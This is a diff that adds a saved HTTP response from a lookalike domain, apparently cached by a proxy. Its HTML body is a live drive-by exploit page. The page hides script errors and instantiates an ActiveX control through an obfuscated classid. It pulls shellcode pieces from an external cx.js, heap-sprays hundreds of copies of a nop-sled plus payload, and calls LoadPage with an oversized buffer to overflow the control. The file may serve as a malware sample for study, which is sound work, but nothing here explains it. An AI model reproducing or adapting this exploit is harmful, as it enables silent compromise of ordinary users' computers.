@@ -1,0 +1,36 @@
+HTTP/1.1 200 OK
+Content-Length: 1050
+ETag: "05c076518ec91:5af"
+Date: Mon, 23 Feb 2009 02:18:06 GMT
+Last-Modified: Sat, 14 Feb 2009 03:08:08 GMT
+Content-Type: text/html
+Accept-Ranges: bytes
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+X-Polipo-Location: http://baidu-baiduyi.cn/cx.htm
+X-Polipo-Date: Mon, 23 Feb 2009 02:39:52 GMT
+X-Polipo-Access: Mon, 23 Feb 2009 03:45:10 GMT
+
+<html>
+<script>window.onerror=function(){return true;}</script>
+<object classid="cls"+"id:7F5E27CE-4A5C-11D3-9232-0000B48A05B2" id='pkpkhaimeng'></object>
+<script src=cx.js></script>
+<SCRIPT language="javascript">
+heiba=haimeng16+haimeng16+haimeng0+haimeng+haimeng1+haimeng2+haimeng3+haimeng4+haimeng5+haimeng6+haimeng7+haimeng8+haimeng9+haimeng10+haimeng11+haimeng12+haimeng99+haimeng13+haimeng14+haimeng15;
+var pkblack = haimeng16+haimeng16;
+var headhaimeng = 20;
+var i="i";
+var ii="i";
+var pkjuhaimeng = headhaimeng+heiba.length;
+while (pkblack.length<pkjuhaimeng) pkblack+=pkblack;
+fillhaimeng = pkblack.substring(0, pkjuhaimeng);
+codejuhaimeng = pkblack.substring(0, pkblack.length-pkjuhaimeng);
+while(codejuhaimeng.length+pkjuhaimeng<0x40000) codejuhaimeng = codejuhaimeng+codejuhaimeng+fillhaimeng;
+modehaimeng = new Array();
+for (x=0; x<300; x++) modehaimeng[x] = codejuhaimeng + heiba;
+var buffer = '';
+while (buffer.length < 3092) buffer+="\x0a\x0a\x0a\x0a";
+pkpkhaimeng.LoadPage(buffer ,1 ,1 ,1);
+</script>
+</html>
+
